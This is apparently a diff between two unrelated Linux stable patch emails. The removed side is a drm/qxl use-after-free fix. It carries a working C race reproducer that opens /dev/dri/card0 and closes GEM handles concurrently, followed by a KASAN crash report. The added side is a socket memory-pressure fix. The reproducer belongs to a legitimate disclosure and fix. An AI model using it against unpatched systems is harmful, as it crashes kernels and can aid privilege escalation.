@@ -2,50 +2,52 @@ Return-Path: <stable-owner@vger.kernel.org>
 X-Original-To: lists+stable@lfdr.de
 Delivered-To: lists+stable@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 2E699783371
-	for <lists+stable@lfdr.de>; Mon, 21 Aug 2023 22:23:23 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 21DC37831DA
+	for <lists+stable@lfdr.de>; Mon, 21 Aug 2023 22:21:18 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S229925AbjHUT6W (ORCPT <rfc822;lists+stable@lfdr.de>);
-        Mon, 21 Aug 2023 15:58:22 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:33474 "EHLO
+        id S230293AbjHUUHY (ORCPT <rfc822;lists+stable@lfdr.de>);
+        Mon, 21 Aug 2023 16:07:24 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:53548 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229922AbjHUT6V (ORCPT
-        <rfc822;stable@vger.kernel.org>); Mon, 21 Aug 2023 15:58:21 -0400
-Received: from dfw.source.kernel.org (dfw.source.kernel.org [IPv6:2604:1380:4641:c500::1])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id E642E136
-        for <stable@vger.kernel.org>; Mon, 21 Aug 2023 12:58:18 -0700 (PDT)
+        with ESMTP id S230294AbjHUUHY (ORCPT
+        <rfc822;stable@vger.kernel.org>); Mon, 21 Aug 2023 16:07:24 -0400
+Received: from dfw.source.kernel.org (dfw.source.kernel.org [139.178.84.217])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 7804BE3
+        for <stable@vger.kernel.org>; Mon, 21 Aug 2023 13:07:22 -0700 (PDT)
 Received: from smtp.kernel.org (relay.kernel.org [52.25.139.140])
         (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
          key-exchange X25519 server-signature RSA-PSS (2048 bits))
         (No client certificate requested)
-        by dfw.source.kernel.org (Postfix) with ESMTPS id 7C37564693
-        for <stable@vger.kernel.org>; Mon, 21 Aug 2023 19:58:18 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 87164C433C8;
-        Mon, 21 Aug 2023 19:58:17 +0000 (UTC)
+        by dfw.source.kernel.org (Postfix) with ESMTPS id 163BA649A4
+        for <stable@vger.kernel.org>; Mon, 21 Aug 2023 20:07:22 +0000 (UTC)
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 25E50C433C8;
+        Mon, 21 Aug 2023 20:07:20 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-        s=korg; t=1692647897;
-        bh=XrK4Jz3gG5IrPcO15IBCqd4eno64jSGrUZXvAD484DA=;
+        s=korg; t=1692648441;
+        bh=QF3DELslLF2bvZP+XIcw45e4YuYmOEZLSjnL3WPncQk=;
         h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-        b=ZLP2Cxf5GqLp7PIKOuPVH4v+35RTWv9nHSQE4KV9xqAgEypwwQTjc2wrqmoG+PlPf
-         L2N3MvZftESUXtCzEmmidi4GCQ8fBw/1iLIQ6jkkxAPa5yC2yXtrzmMGu/s/mS2uOn
-         lFVqURVFlbZEtPEE9MeCKQgx2P0+oPLm2eVO7eK4=
+        b=pWjDqsbXhQNxrASUBFxHlYJgveH2MTSD43ABnnj3uEuJfg8ck4KodswNvFvDr0g8B
+         8flzINwGQZcsFM6MHsilzvDT/z9rxe0v04pu6OO7Ophh9uaOUKJRgxLGkpjwiLZ5/w
+         oYp1pBnMRscsqbCsAZzAcZlsskQ0k2dx1r2r52ww=
 From:   Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To:     stable@vger.kernel.org
 Cc:     Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-        patches@lists.linux.dev, Wander Lairson Costa <wander@redhat.com>,
-        Dave Airlie <airlied@redhat.com>
-Subject: [PATCH 6.1 160/194] drm/qxl: fix UAF on handle creation
+        patches@lists.linux.dev, Abel Wu <wuyun.abel@bytedance.com>,
+        Shakeel Butt <shakeelb@google.com>,
+        Jakub Kicinski <kuba@kernel.org>,
+        Sasha Levin <sashal@kernel.org>
+Subject: [PATCH 6.4 176/234] sock: Fix misuse of sk_under_memory_pressure()
 Date:   Mon, 21 Aug 2023 21:42:19 +0200
-Message-ID: <20230821194129.735678045@linuxfoundation.org>
+Message-ID: <20230821194136.631558457@linuxfoundation.org>
 X-Mailer: git-send-email 2.41.0
-In-Reply-To: <20230821194122.695845670@linuxfoundation.org>
-References: <20230821194122.695845670@linuxfoundation.org>
+In-Reply-To: <20230821194128.754601642@linuxfoundation.org>
+References: <20230821194128.754601642@linuxfoundation.org>
 User-Agent: quilt/0.67
 MIME-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: 8bit
-X-Spam-Status: No, score=-4.4 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
-        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_MED,
+X-Spam-Status: No, score=-7.1 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
+        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_HI,
         SPF_HELO_NONE,SPF_PASS autolearn=ham autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
@@ -53,352 +55,74 @@ Precedence: bulk
 List-ID: <stable.vger.kernel.org>
 X-Mailing-List: stable@vger.kernel.org
 
-From: Wander Lairson Costa <wander@redhat.com>
+From: Abel Wu <wuyun.abel@bytedance.com>
 
-commit c611589b4259ed63b9b77be6872b1ce07ec0ac16 upstream.
+[ Upstream commit 2d0c88e84e483982067a82073f6125490ddf3614 ]
 
-qxl_mode_dumb_create() dereferences the qobj returned by
-qxl_gem_object_create_with_handle(), but the handle is the only one
-holding a reference to it.
+The status of global socket memory pressure is updated when:
 
-A potential attacker could guess the returned handle value and closes it
-between the return of qxl_gem_object_create_with_handle() and the qobj
-usage, triggering a use-after-free scenario.
+  a) __sk_mem_raise_allocated():
 
-Reproducer:
+	enter: sk_memory_allocated(sk) >  sysctl_mem[1]
+	leave: sk_memory_allocated(sk) <= sysctl_mem[0]
 
-int dri_fd =-1;
-struct drm_mode_create_dumb arg = {0};
+  b) __sk_mem_reduce_allocated():
 
-void gem_close(int handle);
+	leave: sk_under_memory_pressure(sk) &&
+		sk_memory_allocated(sk) < sysctl_mem[0]
 
-void* trigger(void* ptr)
-{
-	int ret;
-	arg.width = arg.height = 0x20;
-	arg.bpp = 32;
-	ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &arg);
-	if(ret)
-	{
-		perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
-		exit(-1);
-	}
-	gem_close(arg.handle);
-	while(1) {
-		struct drm_mode_create_dumb args = {0};
-		args.width = args.height = 0x20;
-		args.bpp = 32;
-		ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &args);
-		if (ret) {
-			perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
-			exit(-1);
-		}
+So the conditions of leaving global pressure are inconstant, which
+may lead to the situation that one pressured net-memcg prevents the
+global pressure from being cleared when there is indeed no global
+pressure, thus the global constrains are still in effect unexpectedly
+on the other sockets.
 
-		printf("[*] DRM_IOCTL_MODE_CREATE_DUMB created, %d\n", args.handle);
-		gem_close(args.handle);
-	}
-	return NULL;
-}
+This patch fixes this by ignoring the net-memcg's pressure when
+deciding whether should leave global memory pressure.
 
-void gem_close(int handle)
-{
-	struct drm_gem_close args;
-	args.handle = handle;
-	int ret = ioctl(dri_fd, DRM_IOCTL_GEM_CLOSE, &args); // gem close handle
-	if (!ret)
-		printf("gem close handle %d\n", args.handle);
-}
-
-int main(void)
-{
-	dri_fd= open("/dev/dri/card0", O_RDWR);
-	printf("fd:%d\n", dri_fd);
-
-	if(dri_fd == -1)
-		return -1;
-
-	pthread_t tid1;
-
-	if(pthread_create(&tid1,NULL,trigger,NULL)){
-		perror("[*] thread_create tid1\n");
-		return -1;
-	}
-	while (1)
-	{
-		gem_close(arg.handle);
-	}
-	return 0;
-}
-
-This is a KASAN report:
-
-==================================================================
-BUG: KASAN: slab-use-after-free in qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
-Write of size 1 at addr ffff88801136c240 by task poc/515
-
-CPU: 1 PID: 515 Comm: poc Not tainted 6.3.0 #3
-Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.0-debian-1.16.0-4 04/01/2014
-Call Trace:
-<TASK>
-__dump_stack linux/lib/dump_stack.c:88
-dump_stack_lvl+0x48/0x70 linux/lib/dump_stack.c:106
-print_address_description linux/mm/kasan/report.c:319
-print_report+0xd2/0x660 linux/mm/kasan/report.c:430
-kasan_report+0xd2/0x110 linux/mm/kasan/report.c:536
-__asan_report_store1_noabort+0x17/0x30 linux/mm/kasan/report_generic.c:383
-qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
-drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
-drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
-drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
-drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
-vfs_ioctl linux/fs/ioctl.c:51
-__do_sys_ioctl linux/fs/ioctl.c:870
-__se_sys_ioctl linux/fs/ioctl.c:856
-__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
-do_syscall_x64 linux/arch/x86/entry/common.c:50
-do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
-entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
-RIP: 0033:0x7ff5004ff5f7
-Code: 00 00 00 48 8b 05 99 c8 0d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 69 c8 0d 00 f7 d8 64 89 01 48
-
-RSP: 002b:00007ff500408ea8 EFLAGS: 00000286 ORIG_RAX: 0000000000000010
-RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007ff5004ff5f7
-RDX: 00007ff500408ec0 RSI: 00000000c02064b2 RDI: 0000000000000003
-RBP: 00007ff500408ef0 R08: 0000000000000000 R09: 000000000000002a
-R10: 0000000000000000 R11: 0000000000000286 R12: 00007fff1c6cdafe
-R13: 00007fff1c6cdaff R14: 00007ff500408fc0 R15: 0000000000802000
-</TASK>
-
-Allocated by task 515:
-kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
-kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
-kasan_save_alloc_info+0x1e/0x40 linux/mm/kasan/generic.c:510
-____kasan_kmalloc linux/mm/kasan/common.c:374
-__kasan_kmalloc+0xc3/0xd0 linux/mm/kasan/common.c:383
-kasan_kmalloc linux/./include/linux/kasan.h:196
-kmalloc_trace+0x48/0xc0 linux/mm/slab_common.c:1066
-kmalloc linux/./include/linux/slab.h:580
-kzalloc linux/./include/linux/slab.h:720
-qxl_bo_create+0x11a/0x610 linux/drivers/gpu/drm/qxl/qxl_object.c:124
-qxl_gem_object_create+0xd9/0x360 linux/drivers/gpu/drm/qxl/qxl_gem.c:58
-qxl_gem_object_create_with_handle+0xa1/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:89
-qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
-drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
-drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
-drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
-drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
-vfs_ioctl linux/fs/ioctl.c:51
-__do_sys_ioctl linux/fs/ioctl.c:870
-__se_sys_ioctl linux/fs/ioctl.c:856
-__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
-do_syscall_x64 linux/arch/x86/entry/common.c:50
-do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
-entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
-
-Freed by task 515:
-kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
-kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
-kasan_save_free_info+0x2e/0x60 linux/mm/kasan/generic.c:521
-____kasan_slab_free linux/mm/kasan/common.c:236
-____kasan_slab_free+0x180/0x1f0 linux/mm/kasan/common.c:200
-__kasan_slab_free+0x12/0x30 linux/mm/kasan/common.c:244
-kasan_slab_free linux/./include/linux/kasan.h:162
-slab_free_hook linux/mm/slub.c:1781
-slab_free_freelist_hook+0xd2/0x1a0 linux/mm/slub.c:1807
-slab_free linux/mm/slub.c:3787
-__kmem_cache_free+0x196/0x2d0 linux/mm/slub.c:3800
-kfree+0x78/0x120 linux/mm/slab_common.c:1019
-qxl_ttm_bo_destroy+0x140/0x1a0 linux/drivers/gpu/drm/qxl/qxl_object.c:49
-ttm_bo_release+0x678/0xa30 linux/drivers/gpu/drm/ttm/ttm_bo.c:381
-kref_put linux/./include/linux/kref.h:65
-ttm_bo_put+0x50/0x80 linux/drivers/gpu/drm/ttm/ttm_bo.c:393
-qxl_gem_object_free+0x3e/0x60 linux/drivers/gpu/drm/qxl/qxl_gem.c:42
-drm_gem_object_free+0x5c/0x90 linux/drivers/gpu/drm/drm_gem.c:974
-kref_put linux/./include/linux/kref.h:65
-__drm_gem_object_put linux/./include/drm/drm_gem.h:431
-drm_gem_object_put linux/./include/drm/drm_gem.h:444
-qxl_gem_object_create_with_handle+0x151/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:100
-qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
-drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
-drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
-drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
-drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
-vfs_ioctl linux/fs/ioctl.c:51
-__do_sys_ioctl linux/fs/ioctl.c:870
-__se_sys_ioctl linux/fs/ioctl.c:856
-__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
-do_syscall_x64 linux/arch/x86/entry/common.c:50
-do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
-entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
-
-The buggy address belongs to the object at ffff88801136c000
-which belongs to the cache kmalloc-1k of size 1024
-The buggy address is located 576 bytes inside of
-freed 1024-byte region [ffff88801136c000, ffff88801136c400)
-
-The buggy address belongs to the physical page:
-page:0000000089fc329b refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x11368
-head:0000000089fc329b order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
-flags: 0xfffffc0010200(slab|head|node=0|zone=1|lastcpupid=0x1fffff)
-raw: 000fffffc0010200 ffff888007841dc0 dead000000000122 0000000000000000
-raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
-page dumped because: kasan: bad access detected
-
-Memory state around the buggy address:
-ffff88801136c100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-ffff88801136c180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
->ffff88801136c200: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-^
-ffff88801136c280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-ffff88801136c300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-==================================================================
-Disabling lock debugging due to kernel taint
-
-Instead of returning a weak reference to the qxl_bo object, return the
-created drm_gem_object and let the caller decrement the reference count
-when it no longer needs it. As a convenience, if the caller is not
-interested in the gobj object, it can pass NULL to the parameter and the
-reference counting is descremented internally.
-
-The bug and the reproducer were originally found by the Zero Day Initiative project (ZDI-CAN-20940).
-
-Link: https://www.zerodayinitiative.com/
-Signed-off-by: Wander Lairson Costa <wander@redhat.com>
-Cc: stable@vger.kernel.org
-Reviewed-by: Dave Airlie <airlied@redhat.com>
-Signed-off-by: Dave Airlie <airlied@redhat.com>
-Link: https://patchwork.freedesktop.org/patch/msgid/20230814165119.90847-1-wander@redhat.com
-Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
+Fixes: e1aab161e013 ("socket: initial cgroup code.")
+Signed-off-by: Abel Wu <wuyun.abel@bytedance.com>
+Acked-by: Shakeel Butt <shakeelb@google.com>
+Link: https://lore.kernel.org/r/20230816091226.1542-1-wuyun.abel@bytedance.com
+Signed-off-by: Jakub Kicinski <kuba@kernel.org>
+Signed-off-by: Sasha Levin <sashal@kernel.org>
 ---
- drivers/gpu/drm/qxl/qxl_drv.h   |    2 +-
- drivers/gpu/drm/qxl/qxl_dumb.c  |    5 ++++-
- drivers/gpu/drm/qxl/qxl_gem.c   |   25 +++++++++++++++++--------
- drivers/gpu/drm/qxl/qxl_ioctl.c |    6 ++----
- 4 files changed, 24 insertions(+), 14 deletions(-)
+ include/net/sock.h | 6 ++++++
+ net/core/sock.c    | 2 +-
+ 2 files changed, 7 insertions(+), 1 deletion(-)
 
---- a/drivers/gpu/drm/qxl/qxl_drv.h
-+++ b/drivers/gpu/drm/qxl/qxl_drv.h
-@@ -312,7 +312,7 @@ int qxl_gem_object_create_with_handle(st
- 				      u32 domain,
- 				      size_t size,
- 				      struct qxl_surface *surf,
--				      struct qxl_bo **qobj,
-+				      struct drm_gem_object **gobj,
- 				      uint32_t *handle);
- void qxl_gem_object_free(struct drm_gem_object *gobj);
- int qxl_gem_object_open(struct drm_gem_object *obj, struct drm_file *file_priv);
---- a/drivers/gpu/drm/qxl/qxl_dumb.c
-+++ b/drivers/gpu/drm/qxl/qxl_dumb.c
-@@ -34,6 +34,7 @@ int qxl_mode_dumb_create(struct drm_file
- {
- 	struct qxl_device *qdev = to_qxl(dev);
- 	struct qxl_bo *qobj;
-+	struct drm_gem_object *gobj;
- 	uint32_t handle;
- 	int r;
- 	struct qxl_surface surf;
-@@ -62,11 +63,13 @@ int qxl_mode_dumb_create(struct drm_file
- 
- 	r = qxl_gem_object_create_with_handle(qdev, file_priv,
- 					      QXL_GEM_DOMAIN_CPU,
--					      args->size, &surf, &qobj,
-+					      args->size, &surf, &gobj,
- 					      &handle);
- 	if (r)
- 		return r;
-+	qobj = gem_to_qxl_bo(gobj);
- 	qobj->is_dumb = true;
-+	drm_gem_object_put(gobj);
- 	args->pitch = pitch;
- 	args->handle = handle;
- 	return 0;
---- a/drivers/gpu/drm/qxl/qxl_gem.c
-+++ b/drivers/gpu/drm/qxl/qxl_gem.c
-@@ -72,32 +72,41 @@ int qxl_gem_object_create(struct qxl_dev
- 	return 0;
+diff --git a/include/net/sock.h b/include/net/sock.h
+index ad468fe71413a..415f3840a26aa 100644
+--- a/include/net/sock.h
++++ b/include/net/sock.h
+@@ -1421,6 +1421,12 @@ static inline bool sk_has_memory_pressure(const struct sock *sk)
+ 	return sk->sk_prot->memory_pressure != NULL;
  }
  
-+/*
-+ * If the caller passed a valid gobj pointer, it is responsible to call
-+ * drm_gem_object_put() when it no longer needs to acess the object.
-+ *
-+ * If gobj is NULL, it is handled internally.
-+ */
- int qxl_gem_object_create_with_handle(struct qxl_device *qdev,
- 				      struct drm_file *file_priv,
- 				      u32 domain,
- 				      size_t size,
- 				      struct qxl_surface *surf,
--				      struct qxl_bo **qobj,
-+				      struct drm_gem_object **gobj,
- 				      uint32_t *handle)
++static inline bool sk_under_global_memory_pressure(const struct sock *sk)
++{
++	return sk->sk_prot->memory_pressure &&
++		!!*sk->sk_prot->memory_pressure;
++}
++
+ static inline bool sk_under_memory_pressure(const struct sock *sk)
  {
--	struct drm_gem_object *gobj;
- 	int r;
-+	struct drm_gem_object *local_gobj;
+ 	if (!sk->sk_prot->memory_pressure)
+diff --git a/net/core/sock.c b/net/core/sock.c
+index 1f31a97100d4f..8451a95266bf0 100644
+--- a/net/core/sock.c
++++ b/net/core/sock.c
+@@ -3107,7 +3107,7 @@ void __sk_mem_reduce_allocated(struct sock *sk, int amount)
+ 	if (mem_cgroup_sockets_enabled && sk->sk_memcg)
+ 		mem_cgroup_uncharge_skmem(sk->sk_memcg, amount);
  
--	BUG_ON(!qobj);
- 	BUG_ON(!handle);
- 
- 	r = qxl_gem_object_create(qdev, size, 0,
- 				  domain,
- 				  false, false, surf,
--				  &gobj);
-+				  &local_gobj);
- 	if (r)
- 		return -ENOMEM;
--	r = drm_gem_handle_create(file_priv, gobj, handle);
-+	r = drm_gem_handle_create(file_priv, local_gobj, handle);
- 	if (r)
- 		return r;
--	/* drop reference from allocate - handle holds it now */
--	*qobj = gem_to_qxl_bo(gobj);
--	drm_gem_object_put(gobj);
-+
-+	if (gobj)
-+		*gobj = local_gobj;
-+	else
-+		/* drop reference from allocate - handle holds it now */
-+		drm_gem_object_put(local_gobj);
-+
- 	return 0;
+-	if (sk_under_memory_pressure(sk) &&
++	if (sk_under_global_memory_pressure(sk) &&
+ 	    (sk_memory_allocated(sk) < sk_prot_mem_limits(sk, 0)))
+ 		sk_leave_memory_pressure(sk);
  }
- 
---- a/drivers/gpu/drm/qxl/qxl_ioctl.c
-+++ b/drivers/gpu/drm/qxl/qxl_ioctl.c
-@@ -38,7 +38,6 @@ int qxl_alloc_ioctl(struct drm_device *d
- 	struct qxl_device *qdev = to_qxl(dev);
- 	struct drm_qxl_alloc *qxl_alloc = data;
- 	int ret;
--	struct qxl_bo *qobj;
- 	uint32_t handle;
- 	u32 domain = QXL_GEM_DOMAIN_VRAM;
- 
-@@ -50,7 +49,7 @@ int qxl_alloc_ioctl(struct drm_device *d
- 						domain,
- 						qxl_alloc->size,
- 						NULL,
--						&qobj, &handle);
-+						NULL, &handle);
- 	if (ret) {
- 		DRM_ERROR("%s: failed to create gem ret=%d\n",
- 			  __func__, ret);
-@@ -386,7 +385,6 @@ int qxl_alloc_surf_ioctl(struct drm_devi
- {
- 	struct qxl_device *qdev = to_qxl(dev);
- 	struct drm_qxl_alloc_surf *param = data;
--	struct qxl_bo *qobj;
- 	int handle;
- 	int ret;
- 	int size, actual_stride;
-@@ -406,7 +404,7 @@ int qxl_alloc_surf_ioctl(struct drm_devi
- 						QXL_GEM_DOMAIN_SURFACE,
- 						size,
- 						&surf,
--						&qobj, &handle);
-+						NULL, &handle);
- 	if (ret) {
- 		DRM_ERROR("%s: failed to create gem ret=%d\n",
- 			  __func__, ret);
+-- 
+2.40.1
+
 
 
